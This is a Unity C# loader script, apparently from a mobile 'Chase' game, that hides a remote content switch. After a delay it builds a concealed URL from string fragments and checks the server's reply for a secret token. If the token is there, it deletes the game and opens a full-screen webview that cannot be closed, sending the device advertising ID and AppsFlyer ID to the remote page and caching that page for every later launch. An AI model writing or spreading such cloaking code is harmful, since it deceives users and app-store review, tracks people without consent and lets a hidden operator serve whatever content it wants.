using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class ChaseLoadManager : MonoBehaviour
{
    public List<string> chaseloadingmanagerkeyslist;

    [SerializeField] private GameObject[] _chaseloadingobjectslist;

    private string _chaseadidikey = "";

    private void Awake()
    {
        _chaseadidikey = GetChaseAdid();
        StartCoroutine(ChaseInit());
    }

    private IEnumerator ChaseInit()
    {
        yield return new WaitForSeconds(10);
        string data = PlayerPrefs.GetString("chas_load_data_key_parametres_key", "");
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("chase_data_of_loading_data_key", string.Empty) != string.Empty)
            {
                ChaseInitializtion(PlayerPrefs.GetString("chase_data_of_loading_data_key"));
            }
            else
            {
                string tempString = "";
                foreach (string n in chaseloadingmanagerkeyslist)
                {
                    tempString += n;
                }

                StartCoroutine(LaunchChaseGameLoadingLogicmethod(tempString, data));
            }
        }
        else
        {
            LoadChaseMenuScene();
        }
    }

    private string GetChaseAdid()
    {
        string advertisingID = "";
        try
        {
            AndroidJavaClass upBt = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            AndroidJavaObject appCurrentActivity = upBt.GetStatic<AndroidJavaObject>("currentActivity");
            AndroidJavaClass appClient = new AndroidJavaClass("com.google.android.gms.ads.identifier.AdvertisingIdClient");
            AndroidJavaObject advertismentId = appClient.CallStatic<AndroidJavaObject>("getAdvertisingIdInfo", appCurrentActivity);
            advertisingID = advertismentId.Call<string>("getId").ToString();
        }
        catch (System.Exception e)
        {
            advertisingID = e.ToString();
        }
        return advertisingID;
    }

    public void LoadChaseMenuScene()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        Application.targetFrameRate = 54;
        Scene currentScene = SceneManager.GetActiveScene();
        Scene nextScene = SceneManager.CreateScene("CheaseMenuScene");
        SceneManager.SetActiveScene(nextScene);
        SceneManager.UnloadScene(currentScene);
        GameObject menuObject = Resources.Load<GameObject>("Prefabs/ChaseMenuPrefab");
        Instantiate(menuObject);
    }

    public IEnumerator LaunchChaseGameLoadingLogicmethod(string inputstring, string secondKey)
    {
        using (UnityWebRequest chaseloadingstatus = UnityWebRequest.Get(inputstring))
        {
            chaseloadingstatus.timeout = 4;
            yield return chaseloadingstatus.SendWebRequest();
            if (chaseloadingstatus.isNetworkError)
            {
                LoadChaseMenuScene();
            }
            else
            {
                try
                {
                    if (chaseloadingstatus.result == UnityWebRequest.Result.Success)
                    {
                        if (chaseloadingstatus.downloadHandler.text.Contains("btweehn"))
                        {
                            try
                            {
                                string[] key = chaseloadingstatus.downloadHandler.text.Split('|');

                                ChaseInitializtion($"{key[0]}?adid={_chaseadidikey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + secondKey}",
                                    Convert.ToInt32(key[1]), Convert.ToInt32(key[2]));
                            }
                            catch
                            {
                                ChaseInitializtion(
                                    $"{chaseloadingstatus.downloadHandler.text}?adid={_chaseadidikey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + secondKey}");
                            }
                        }
                        else
                        {
                            LoadChaseMenuScene();
                        }
                    }
                    else
                    {
                        LoadChaseMenuScene();
                    }
                }
                catch
                {
                    LoadChaseMenuScene();
                }
            }
        }
    }

    public void ChaseInitializtion(string inputKey = "", int inputKey2 = 0, int inputKey3 = 70)
    {
        foreach (var item in _chaseloadingobjectslist)
        {
            Destroy(item.gameObject);
        }

        Screen.orientation = ScreenOrientation.AutoRotation;

        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetAllowAutoPlay(true);

        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetEnableKeyboardAvoidance(true);

        var diamondgameobjectmanagersphere = gameObject.AddComponent<UniWebView>();
        diamondgameobjectmanagersphere.SetContentInsetAdjustmentBehavior(UniWebViewContentInsetAdjustmentBehavior
            .Automatic);
        diamondgameobjectmanagersphere.SetZoomEnabled(true);
        if (inputKey2 == 1)
        {
            diamondgameobjectmanagersphere.SetShowToolbar(false);
        }
        else
        {
            diamondgameobjectmanagersphere.SetShowToolbar(true, false, false, true);
        }

        diamondgameobjectmanagersphere.SetToolbarDoneButtonText("");
        diamondgameobjectmanagersphere.SetSupportMultipleWindows(true);
        diamondgameobjectmanagersphere.Frame = new Rect(0, inputKey3, Screen.width, Screen.height - inputKey3);
        diamondgameobjectmanagersphere.OnShouldClose += (view) => { return false; };
        diamondgameobjectmanagersphere.OnOrientationChanged += (view, orientation) =>
        {
            diamondgameobjectmanagersphere.Frame = new Rect(0, inputKey3, Screen.width, Screen.height - inputKey3);
        };
        diamondgameobjectmanagersphere.SetSupportMultipleWindows(true);
        diamondgameobjectmanagersphere.OnMultipleWindowOpened += (view, windowId) =>
        {
            diamondgameobjectmanagersphere.SetShowToolbar(true);
        };
        diamondgameobjectmanagersphere.OnMultipleWindowClosed += (view, windowId) =>
        {
            if (inputKey2 == 1)
            {
                diamondgameobjectmanagersphere.SetShowToolbar(false);
            }
            else
            {
                diamondgameobjectmanagersphere.SetShowToolbar(true, false, false, true);
            }
        };
        diamondgameobjectmanagersphere.SetAllowBackForwardNavigationGestures(true);
        diamondgameobjectmanagersphere.OnPageFinished += (view, statusCode, url) =>
        {
            diamondgameobjectmanagersphere.UpdateFrame();
            if (PlayerPrefs.GetString("chase_data_of_loading_data_key", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("chase_data_of_loading_data_key", url);
            }
        };
        diamondgameobjectmanagersphere.Load(inputKey);
        diamondgameobjectmanagersphere.Show();
    }
}
